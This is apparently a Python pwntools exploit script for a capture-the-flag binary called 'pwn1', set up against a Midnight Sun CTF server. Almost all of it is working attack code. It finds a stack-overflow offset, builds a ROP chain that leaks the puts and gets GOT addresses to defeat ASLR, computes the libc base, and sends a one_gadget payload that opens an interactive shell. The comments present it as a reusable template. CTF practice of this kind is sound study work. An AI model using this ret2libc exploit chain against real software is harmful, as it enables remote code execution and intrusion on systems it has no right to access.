from pwn import *
from struct import pack
import time

##########################################################################
# My approach to Binary Exploitation on ASLR Enabled systems.
# DOWNLOAD PWNTOOLS TO RUN!
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################

nops = b'\x90'
padding = b'\x00'

clean = lambda x: x.split('\n')[1:-2]
pad = lambda x: x + padding*(8-len(x))

LOCAL_LIBC = "/usr/lib/x86_64-linux-gnu/libc-2.31.so"
REMOTE_LIBC = "libc.so"

REMOTE_IP = 'pwn1-01.play.midnightsunctf.se'
REMOTE_PORT = 10001

VULN_BIN = './pwn1'

GDB_FLAGS = """
            b *0x400716 
            b *0x4006fa
            c
            """

READUNTIL_STRING = 'buffer: '

##########################################################################
# Load Binaries and Respective libc
#
# To Find the Libc version, make ROP chain to print address of libc
# functions, which are stored in GOT table as values of pointers.
# Just pass the address of pointer to RDI through pop rdi; ret
# And call puts function.
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################

elf = ELF(VULN_BIN)
context.binary = VULN_BIN
# libc  = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
##########################################################################
# Find Offset
##########################################################################

r = elf.process()
crash = cyclic(1024)
r.clean()
r.sendline(crash)
r.wait()
core = r.corefile
rsp = core.rsp
offset = core.read(rsp, 4)
offset =  cyclic_find(offset)
success("Offset found @ {a} bytes".format(a=offset))

##########################################################################
# Generate Initial Payload to Leak memory
##########################################################################

# Find manually
crashOffset = offset

rop = ROP(elf)

junk = nops*(crashOffset)
poprdi = p64(rop.find_gadget(['pop rdi']).address)

### elf.got contains pointers containing actual addresses of query functions
puts = p64(elf.got['puts'])
gets = p64(elf.got['gets'])

### elf.symbols contains addresses of functions (and stubs as here)
putsret = p64(elf.symbols['puts'])
mainret = p64(0x4005a0)#p64(elf.symbols['main'])

##########################################################################
# Demo ==> (poprdi + puts + putsret) 
# puts -> pointer of GOT table entry of puts
# putsret -> stub function calling actual puts
# TO FIND LIBC VERSION, use https://libc.blukat.me/
# Use ROPgadget to find gadgets
##########################################################################

### This Payload prints puts and gets addressed and calls main function again
payload = b''.join([junk, \
    poprdi, puts, putsret, \
    poprdi, gets, putsret, \
    mainret])

def exploitFirstStage(payload, local=False):
    if local:
        r = elf.process()
        gdb.attach(r.pid, GDB_FLAGS)
    else:
        r = remote(REMOTE_IP, REMOTE_PORT)
    print(r.readuntil(READUNTIL_STRING))  
    r.sendline(payload)
    return r

##########################################################################
# Compute Libc Base address from leaked addresses
##########################################################################

def computeLibcBase(r, libc):
    puts_leak = u64(pad(r.readline())) & 0x0ffffffffffff
    fgets_leak = u64(pad(r.readline())) & 0x0ffffffffffff
    print("puts: ", hex(puts_leak))
    print("gets: ", hex(fgets_leak))
    puts_offset = libc.symbols['puts']
    libc_base = puts_leak - puts_offset
    # This address must be 0x1000 aligned, if not, its Probably wrong!
    print("libc base: ", hex(libc_base))
    if(libc_base & 0x0000000000000fff):
        print("ALERT! Program is probably using different libc than specified!")
    return libc_base

##########################################################################
# Now Actual Exploitation!
# Use libc base address to generate address of a one gadget!
# use one_gadget to find one gadgets
##########################################################################

def exploit(local=False, one_gadget=0x10a38c):
    if local:
        libc = ELF(LOCAL_LIBC)
    else:
        libc = ELF(REMOTE_LIBC)
    r = exploitFirstStage(payload, local=local)
    libc_base = computeLibcBase(r, libc)
    time.sleep(1)
    r.clean()
    # sys_offset = p64(0x45390 + libc_base)
    one_gadget = p64( one_gadget + libc_base) # from one_gadget
    npayload = b''.join([junk, \
        one_gadget, padding*8])
    r.clean()
    r.sendline(npayload)
    # Get Interactive shell
    r.interactive()
